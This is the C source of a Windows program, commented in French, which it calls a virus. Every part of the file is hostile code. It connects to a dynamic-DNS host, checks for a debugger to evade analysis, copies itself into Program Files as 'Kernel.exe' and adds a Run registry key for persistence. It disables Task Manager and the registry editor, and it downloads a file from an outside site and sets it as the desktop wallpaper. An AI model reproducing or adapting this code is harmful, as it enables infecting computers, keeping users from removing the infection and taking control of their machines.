#define _WIN32_WINNT  0x501
#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>

typedef int socklen_t;

void reseau()
{
    /*Coin reseau*/

    int sockfd;
    struct addrinfo hints, *servinfo, *p;
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; 
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo("maxia.no-ip.biz", "2303", &hints, &servinfo)) != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
        exit(1);
    }

    
    for(p = servinfo; p != NULL; p = p->ai_next)
    {
        if ((sockfd = socket(p->ai_family, p->ai_socktype,
                             p->ai_protocol)) == -1)
        {
            perror("socket");
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1)
        {
            close(sockfd);
            perror("connect");
            continue;
        }
        printf("Haleluya");
        break; // connexion reussi
    }

    if (p == NULL)
    {
        
        fprintf(stderr, "failed to connect\n");
        exit(2);
    }

    freeaddrinfo(servinfo); 
}


int main(int argc, char* argv[])
{
    HKEY clef;

    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,2), &WSAData);

    reseau();

    if(!IsDebuggerPresent())
    {
        if(RegOpenKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Maxia", &clef) == ERROR_SUCCESS) // si le virus est deja la
        {
            Sleep(120000);

            reseau();

            int continuer = 1;

            while(continuer)
            {
                while(continuer)
                {
                    time_t temps;
                    struct tm *tempslocal;
                    time(&temps);
                    tempslocal = localtime(&temps);
                    int Jour = tempslocal -> tm_mday;
                    int Mois = tempslocal -> tm_mon;
                }
            }


        }
        else // si c'est la premiere execution du virus
        {

            LPCTSTR origine_fichier = argv[0];
            LPCTSTR destination_fichier = "C:\\Program Files\\Kernel.exe";

            if(CopyFile(origine_fichier, destination_fichier, FALSE))
            {
                HKEY key;


                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "Kernel", 0, REG_SZ, (BYTE*)"\"C:\\Program Files\\Kernel.exe\"", strlen("\"C:\\Program Files\\Kernel.exe\"") + 1);

                RegCloseKey(key);

                RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Maxia", &key);

                RegCloseKey(key);

                DWORD value = 1;

                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, (BYTE*) &value, sizeof(value));

                RegCloseKey(key);

                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
                RegSetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, (BYTE*) &value, sizeof(value));

                RegCloseKey(key);


                URLDownloadToFile(NULL, "http://maxia.olympe.in/img/saw.jpg", "C:\\Program Files\\kernel.jpg", 0, NULL);
                if(URLDownloadToFile(NULL, "http://maxia.olympe.in/img/saw.jpg", "C:\\Windows\\x36.jpg", 0, NULL) == S_OK)
                {
                    RegOpenKeyEx(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_ALL_ACCESS, &key);
                    RegSetValueEx(key, "Wallpaper", 0, REG_SZ, (BYTE*)"\"C:\\Windows\\x36.jpg\"", strlen("\"C:\\Windows\\x36.jpg\""));
                    RegCloseKey(key);
                }

                reseau();
            }

            WSACleanup();

            //return 0;

            return 0;
        }
    }
}
